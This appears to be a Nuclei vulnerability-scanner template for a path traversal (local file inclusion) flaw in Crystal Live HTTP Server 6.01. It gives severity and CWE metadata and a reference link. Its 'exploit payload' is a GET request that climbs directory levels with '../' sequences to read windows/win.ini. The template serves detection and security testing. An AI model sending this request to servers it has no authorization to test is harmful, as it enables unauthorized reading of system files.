# Nuclei Template: Crystal Live HTTP Server 6.01 - Local File Inclusion
**Template ID:** crystal-live-server-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`crystal-live-server-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Crystal Live HTTP Server 6.01 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/../../../../../../../../../../../../windows/win.ini
```

## References
- https://cxsecurity.com/issue/WLB-2019110127
